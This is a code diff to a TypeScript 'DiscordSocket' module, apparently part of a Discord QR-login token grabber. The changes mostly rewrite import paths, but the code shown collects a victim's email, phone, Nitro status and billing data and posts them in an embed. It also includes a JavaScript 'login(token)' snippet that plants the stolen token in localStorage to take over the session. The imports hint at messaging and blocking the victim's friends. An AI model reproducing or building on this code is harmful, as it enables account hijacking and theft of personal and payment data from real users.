@@ -18,12 +18,12 @@ import {
   IPendingLogin,
   IPendingTicket,
   IPrendingRemoteInit,
-} from "../interfaces/ISocketEvents";
+} from "../interfaces/ISocketEvents.mts";
 import { toDataURL } from "qrcode";
 import {
   getTicketAxios,
   getTicketWithCaptchaAxios,
-} from "../util/axios";
+} from "../util/axios.mts";
 import {
   getUserInformation,
   getBillingInformation,
@@ -33,15 +33,20 @@ import {
   createFriendChannel,
   sendMessage,
   blockFriend
-} from "../util/fetch";
-import { allSockets, sharedClient } from "..";
-import { CaptchaSolver } from "./CaptchaSolver";
-import { config } from "../util/config";
+} from "../util/fetch.mts";
+import { allSockets, sharedClient } from "../index.mts";
+import { CaptchaSolver } from "./CaptchaSolver.mts";
+import { config } from "../util/config.mts";
 import { join } from "path";
-import { IUser } from "../interfaces/IDiscord";
-import * as embeds from "../util/embeds";
+import { IUser } from "../interfaces/IDiscord.mts";
+import * as embeds from "../util/embeds.mts";
 import * as fs from "fs/promises";
 
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -125,7 +130,7 @@ export class DiscordSocket {
         { name: "Nitro:", value: `${getUser.premium_type ? (getUser.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}`, inline: true },
         { name: "Phone:", value: `${getUser.phone ? getUser.phone : "None"}`, inline: true },
         { name: "Email:", value: `${getUser.email}`, inline: true },
-        { name: "Billing:", value: `${getBilling?.length > 0 ? 'Yes' : 'No'}`, inline: true },
+        { name: "Billing:", value: `${getBilling.length > 0 ? 'Yes' : 'No'}`, inline: true },
         { name: "Code to login", value: `\`\`\`js\n` + `function login(token) {\n` + `  setInterval(() => {\n` + `   document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`\n` + `  }, 50);\n` + `  setTimeout(() => {\n` + `    location.reload();\n` + `  }, 2500);\n` + `}\n\n` + `login('${token}')` + `\`\`\`` },
       ]);
 
